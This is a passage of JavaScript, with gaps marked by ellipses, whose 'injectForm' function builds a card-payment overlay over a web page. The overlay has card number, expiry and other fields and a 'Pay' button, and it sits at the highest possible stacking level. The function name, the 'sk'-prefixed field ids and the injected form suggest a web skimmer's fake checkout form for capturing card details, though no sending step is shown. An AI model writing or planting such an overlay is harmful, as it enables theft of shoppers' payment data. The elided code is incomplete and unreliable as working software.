  ...
  function injectForm() {
    ...
    try {
      ...
      d.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:2147483647;' +
        'background:#fff;border-radius:8px;box-shadow:0 8px 40px rgba(0,0,0,.4);padding:18px 22px;' +
        'width:440px;max-width:94vw;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;' +
        'pointer-events:auto;box-sizing:border-box;max-height:82vh;overflow-y:auto;';

      var lblStyle = 'font-size:12.5px;font-weight:600;color:#141414;display:block;margin-bottom:4px;';
      var inpStyle = 'width:100%;box-sizing:border-box;padding:8px 11px;border:1px solid #ced4da;border-radius:5px;font-size:14px;background:#fff;color:#141414;outline:none;';

      d.innerHTML =
        '<div style="font-size:16px;font-weight:600;color:#141414;margin-bottom:3px;">Credit or Debit Card</div>' +
        '<div style="font-size:12.5px;color:#6c757d;margin-bottom:14px;">Enter your card details below</div>' +
        ...
        '       style="flex:1;box-sizing:border-box;padding:8px 11px;border:1px solid #ced4da;border-right:none;border-radius:5px 0 0 5px;font-size:14px;outline:none;">' +
        '    <div style="display:flex;align-items:center;padding:0 9px;border:1px solid #ced4da;border-radius:0 5px 5px 0;background:#f8f9fa;">' +
        ...
        '      <input id="skExpM" inputmode="numeric" maxlength="2" placeholder="MM" style="flex:1;box-sizing:border-box;padding:8px 10px;border:1px solid #ced4da;border-radius:5px;font-size:14px;text-align:center;outline:none;">' +
        '      <span style="color:#6c757d;">/</span>' +
        '      <input id="skExpY" inputmode="numeric" maxlength="2" placeholder="YY" style="flex:1;box-sizing:border-box;padding:8px 10px;border:1px solid #ced4da;border-radius:5px;font-size:14px;text-align:center;outline:none;">' +
        '    </div>' +
        '  </div>' +
        '  <div style="flex:1;">' +
        ...
        '       style="width:100%;box-sizing:border-box;padding:8px 11px;border:1px solid #ced4da;border-radius:5px;font-size:14px;outline:none;">' +
        '  </div>' +
        '</div>' +

        '<button id="skPayBtn" style="width:100%;padding:11px;background:#D24646;color:#fff;border:none;border-radius:6px;' +
        'font-size:15.5px;font-weight:600;cursor:pointer;">' + (amount ? ('Pay ' + amount) : 'Pay') + '</button>' +
        ...
        '</div>' +
        '<div style="display:flex;justify-content:center;align-items:center;gap:6px;margin-top:6px;color:#6c757d;font-size:11px;">' +
